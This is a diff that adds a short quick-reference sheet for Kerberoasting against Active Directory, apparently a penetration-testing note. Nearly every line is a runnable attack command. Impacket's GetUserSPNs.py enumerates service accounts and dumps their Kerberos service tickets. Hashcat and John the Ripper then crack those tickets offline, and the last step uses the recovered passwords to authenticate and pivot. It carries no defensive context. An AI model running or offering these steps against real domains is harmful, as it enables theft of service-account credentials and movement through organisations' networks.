@@ -1,0 +1,18 @@
+KERBEROASTING - QUICK REF
+
+Requires: valid low-priv domain credentials
+
+1.  List kerberoastable accounts:
+    GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip>
+
+2.  Dump TGS tickets to file:
+    GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip> -request -outputfile <hash-file>
+
+3a. Crack RC4 tickets (hashcat):
+    hashcat -m 13100 <hash-file> <wordlist-path> --force
+3b. Crack AES256 tickets (hashcat):
+    hashcat -m 19700 <hash-file> <wordlist-path> --force
+3c. John:
+    john --format=krb5tgs --wordlist=<wordlist-path> <hash-file>
+
+4.  Use cracked plaintext password to authenticate / pivot
